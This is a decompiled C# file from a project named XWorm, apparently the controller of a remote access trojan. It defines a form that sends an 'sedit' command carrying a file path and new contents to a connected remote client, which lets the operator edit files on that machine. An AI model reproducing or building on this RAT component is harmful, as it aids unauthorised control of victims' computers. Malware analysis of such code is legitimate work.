using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x02000032 RID: 50
	[DesignerGenerated]
	public partial class TXT : Form
	{
		// Token: 0x06000944 RID: 2372 RVA: 0x00051048 File Offset: 0x0004F248
		public TXT()
		{
			this.InitializeComponent();
		}

		// Token: 0x17000367 RID: 871
		// (get) Token: 0x06000947 RID: 2375 RVA: 0x00051729 File Offset: 0x0004F929
		// (set) Token: 0x06000948 RID: 2376 RVA: 0x00051733 File Offset: 0x0004F933
		internal virtual MenuStrip MenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000368 RID: 872
		// (get) Token: 0x06000949 RID: 2377 RVA: 0x0005173C File Offset: 0x0004F93C
		// (set) Token: 0x0600094A RID: 2378 RVA: 0x00051748 File Offset: 0x0004F948
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000369 RID: 873
		// (get) Token: 0x0600094B RID: 2379 RVA: 0x0005178B File Offset: 0x0004F98B
		// (set) Token: 0x0600094C RID: 2380 RVA: 0x00051798 File Offset: 0x0004F998
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x1700036A RID: 874
		// (get) Token: 0x0600094D RID: 2381 RVA: 0x000517DB File Offset: 0x0004F9DB
		// (set) Token: 0x0600094E RID: 2382 RVA: 0x000517E8 File Offset: 0x0004F9E8
		internal virtual Guna2TextBox Guna2TextBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Guna2TextBox1_TextChanged);
				Guna2TextBox guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged -= eventHandler;
				}
				this._Guna2TextBox1 = value;
				guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged += eventHandler;
				}
			}
		}

		// Token: 0x1700036B RID: 875
		// (get) Token: 0x0600094F RID: 2383 RVA: 0x0005182B File Offset: 0x0004FA2B
		// (set) Token: 0x06000950 RID: 2384 RVA: 0x00051835 File Offset: 0x0004FA35
		internal virtual Guna2TextBox Guna2TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x06000951 RID: 2385 RVA: 0x00051840 File Offset: 0x0004FA40
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"sedit",
				SettingsHelper.SPL,
				this.Guna2TextBox2.Text,
				SettingsHelper.SPL,
				this.Guna2TextBox1.Text
			}));
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
			this.ToolStripMenuItem1.Enabled = false;
		}

		// Token: 0x06000952 RID: 2386 RVA: 0x000518C8 File Offset: 0x0004FAC8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000953 RID: 2387 RVA: 0x00051920 File Offset: 0x0004FB20
		private void Guna2TextBox1_TextChanged(object sender, EventArgs e)
		{
			this.ToolStripMenuItem1.Enabled = true;
		}

		// Token: 0x040003E4 RID: 996
		public Client C;
	}
}
